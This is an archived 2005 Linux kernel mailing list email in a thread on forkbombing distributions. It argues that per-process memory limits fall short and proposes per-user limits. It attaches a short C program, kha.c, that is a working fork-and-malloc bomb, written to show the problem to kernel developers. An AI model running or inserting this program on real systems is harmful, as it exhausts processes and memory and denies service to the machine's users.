Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261882AbVC1Ra4@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261882AbVC1Ra4 (ORCPT <rfc822;willy@w.ods.org>);
	Mon, 28 Mar 2005 12:30:56 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261195AbVC1Raz
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 28 Mar 2005 12:30:55 -0500
Received: from imag.imag.fr ([129.88.30.1]:22431 "EHLO imag.imag.fr")
	by vger.kernel.org with ESMTP id S261962AbVC1R2Y (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Mon, 28 Mar 2005 12:28:24 -0500
Date: Mon, 28 Mar 2005 19:28:20 +0200
To: linux-kernel@vger.kernel.org
Subject: Re: forkbombing Linux distributions
Message-ID: <20050328172820.GA31571@linux.ensimag.fr>
Reply-To: 20050323135317.GA22959@roonstrasse.net
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="u3/rZRmxL6MmkK24"
Content-Disposition: inline
User-Agent: Mutt/1.5.6+20040722i
From: Matthieu Castet <mat@ensilinx1.imag.fr>
X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-1.6 (imag.imag.fr [129.88.30.1]); Mon, 28 Mar 2005 19:28:20 +0200 (CEST)
X-IMAG-MailScanner: Found to be clean
X-IMAG-MailScanner-Information: Please contact the ISP for more information
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


--u3/rZRmxL6MmkK24
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

> The memory limits aren't good enough either: if you set them low
> enough that memory-forkbombs are unperilous for
> RLIMIT_NPROC*RLIMIT_DATA, it's probably too low for serious
> applications.

yes, if you want to run application like openoffice.org you need at
least 200Mo. If you want that your system is usable, you need at least 40 process per user. So 40*200 = 8Go, and it don't think you have all this memory...

I think per user limit could be a solution.

attached a small fork-memory bombing.

Matthieu

--u3/rZRmxL6MmkK24
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="kha.c"

int main()
{
	while(1){
		while(fork()){
			malloc(1);
		}
	}
}

--u3/rZRmxL6MmkK24--
